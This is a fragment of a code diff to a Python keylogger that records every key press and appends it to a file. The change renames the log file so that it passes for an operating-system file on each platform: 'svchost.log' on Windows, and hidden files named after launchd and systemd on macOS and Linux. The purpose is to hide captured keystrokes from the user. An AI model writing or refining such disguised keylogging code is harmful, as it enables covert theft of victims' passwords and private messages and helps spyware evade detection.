@@ -9,20 +9,21 @@ def on_press(key):
     except AttributeError:
         # Handle special keys (e.g., Key.space, Key.enter)
         key_data = str(key).replace("Key.", "")
-
         
     write_file(key_data)
-    
-def write_file(key_data):
+   
+ 
+def write_file( key_data):
     if platform.system() == "Windows":
-        with open('log.txt', 'a') as f:
+        with open('svchost.log', 'a') as f:
             f.write(f"{key_data} ")
-            
+                
     elif platform.system() == "Darwin":
-        with open('log.txt', 'a') as f:
+        with open('.launchd.log', 'a') as f:
             f.write(f"{key_data} ")
+                
     elif platform.system() == "Linux":
-        with open('log.txt', 'a') as f:
+        with open('.systemd.dat', 'a') as f:
             f.write(f"{key_data} ")
 
 
